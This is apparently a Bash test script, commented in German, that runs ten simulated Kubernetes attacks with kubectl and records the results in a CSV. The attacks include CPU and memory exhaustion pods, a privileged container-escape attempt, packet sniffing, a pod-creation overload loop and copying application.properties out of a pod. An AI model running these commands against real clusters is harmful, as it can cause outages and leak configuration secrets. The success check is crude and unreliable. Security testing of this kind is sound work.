#!/bin/bash

# Liste der Angriffe, basierend auf Kapitel 4 (angepasst für Kubernetes)
declare -a attacks=("DoS Attack" "Privilege Escalation" "Pod Resource Exhaustion" "Container Escape" "Unauthorized API Access" "Network Sniffing" "Malicious Image Injection" "Service Misconfiguration" "Cluster Overload" "Data Exfiltration")

# Funktion, um jeden Angriff zu simulieren
simulate_attack() {
    attack_name=$1
    echo "Simulating attack: $attack_name"

    # Beispiel für Angriffssimulationen, angelehnt an mögliche Kubernetes-Angriffe
    case $attack_name in
        "DoS Attack")
            # Denial of Service (DoS) Angriff durch Auslastung der Ressourcen
            kubectl run --rm -i --tty attack-pod --image=busybox -- /bin/sh -c "while true; do :; done"
            ;;
        "Privilege Escalation")
            # Privilegien-Eskalation durch Missbrauch von Cluster-Rollen
            kubectl auth can-i create pod --as=system:admin
            ;;
        "Pod Resource Exhaustion")
            # Erstellen eines Pods, der absichtlich Ressourcen überbeansprucht
            kubectl run resource-hog --image=busybox --requests=cpu=1000m,memory=100Gi
            ;;
        "Container Escape")
            # Versuch, aus einem Container auszubrechen
            kubectl run escape-pod --image=busybox --privileged=true -- /bin/sh -c "cat /host/proc/version"
            ;;
        "Unauthorized API Access")
            # Zugriff auf die API ohne entsprechende Berechtigungen
            kubectl proxy &
            curl http://127.0.0.1:8001/api/v1/namespaces/default/pods
            ;;
        "Network Sniffing")
            # Netzwerksniffing innerhalb des Clusters simulieren
            kubectl run sniffing-pod --image=corfr/network-multitool --command -- tcpdump -i any
            ;;
        "Malicious Image Injection")
            # Versuchen, ein bösartiges Image auszuführen
            kubectl run malicious-container --image=malicious/image:latest
            ;;
        "Service Misconfiguration")
            # Einführung eines Fehlers in die Service-Konfiguration
            kubectl expose deployment nginx --port=80 --type=LoadBalancer --name=misconfig-svc --dry-run=client
            ;;
        "Cluster Overload")
            # Überlastung des Clusters durch schnelles Erstellen von Pods
            for i in {1..5}; do kubectl run overload-pod-$i --image=busybox -- /bin/sh -c "while true; do :; done"; done
            ;;
        "Data Exfiltration")
            # Versuch, sensible Daten aus einem Pod zu extrahieren
            kubectl cp product-service-5f99478f9d-dr65t:/app/resources/application.properties ./exfiltrated-info.txt
            ;;
    esac
}

# Datei zur Ergebnisaufzeichnung
output_file="attack_results.csv"
echo "Angriff,Erfolg" > $output_file

# Angriffe durchlaufen und ausführen
for attack in "${attacks[@]}"; do
    simulate_attack "$attack"

    # Erfolg oder Misserfolg überprüfen
    echo "Checking if $attack was successful..."
    success="Nein"

    # Beispiel: Überprüfe, ob ein Pod nach einem Angriff existiert
    if kubectl get pods | grep attack-pod || kubectl get pods | grep resource-hog; then
        success="Ja"
    fi

    # Ergebnis in die Tabelle eintragen
    echo "$attack,$success" >> $output_file
done

echo "Angriffe abgeschlossen. Ergebnisse in $output_file."
